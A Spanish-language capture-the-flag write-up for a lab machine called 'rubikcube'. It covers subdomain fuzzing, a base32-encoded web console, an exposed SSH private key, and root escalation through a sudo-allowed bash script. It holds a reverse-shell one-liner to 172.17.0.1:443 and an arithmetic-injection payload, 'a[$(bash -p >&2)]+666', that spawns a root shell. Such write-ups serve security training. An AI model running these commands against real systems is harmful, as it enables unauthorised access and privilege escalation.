## Reconocimiento:

Puerto 22 : SSH

Puerto 80 : http

Hay un dominio :

```bash
http://rubikcube.dl
```

Hago fuzzing  a ver si hay un subdominio:

```bash
ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://rubikcube.dl/ -H "Host:FUZZ.rubikcube.dl" -fw 20
```

Encuentro “Administration” 

```bash
http://administration.rubikcube.dl
```

Dentro hay una consola que después de varios intentos me doy cuenta de que solo acepta comandos encriptados en base32, así que pruebo una rev shell.

```bash
echo -n "bash -c 'exec bash -i &>/dev/tcp/172.17.0.1/443 <&1'" | base32
```

Pero no ganamos acceso por que existe una validación del servidor que lo impide.

Probando mas comandos vemos que “ls -la” sirve y nos revela una id_rsa de los posibles usuarios:

```bash
echo -n "cat .id_rsa" | base32

MNQXIIBONFSF64TTME====== 
```

```bash
luisillo
maria
root
```

La copiamos en nuestra maquina y accedemos con el usuario luisillo:

```bash
chmod 600 id_rsa
ssh-keygen -R 172.17.0.2 && ssh -i id_rsa luisillo@172.17.0.2
```

## Escalada: luisillo → root

```bash
sudo -l
(ALL) NOPASSWD: /bin/cube
```

Revisando el código fuente es un script de bash:

```
#!/bin/bash

# Inicio del script de verificación de número
echo -n "Checker de Seguridad "

# Solicitar al usuario que ingrese un número
echo "Por favor, introduzca un número para verificar:"

# Leer la entrada del usuario y almacenar en una variable
read -rp "Digite el número: " num

# Función para comprobar el número ingresado
echo -e "\n"
check_number() {
  local number=$1
  local correct_number=666

  # Verificación del número ingresado
  if [[ $number -eq $correct_number ]]; then
    echo -e "\n[+] Correcto"
  else
    echo -e "\n[!] Incorrecto"
  fi
}

# Llamada a la función para verificar el número
check_number "$num"

# Mensaje de fin de script
echo -e "\n La verificación ha sido completada."
```

1. **Estructura base:**
    - Parece una expresión matemática (ej. `array[index] + valor`)
    - `a[]`: Se interpreta como un *array* en algunos lenguajes
    - `+666`: Suma numérica
2. **Inyección de comando:**
    - `$(whoami >&2)`: Esto es lo crítico
        - `$( )`: Ejecuta un comando en un *subshell* y sustituye su salida
        - `whoami`: Comando que devuelve el usuario actual
        - `>&2`: Redirige la salida al *error estándar* (stderr)

Ahora nos aprovechamos de esto para lanzar una bash como **root:**

```bash
sudo -u root /bin/cube
a[$(bash -p >&2)]+666
```

Y listo

(La información sobre el script de la escalda fue sacada del writeup de AlxSAGA, disponible en la página.)
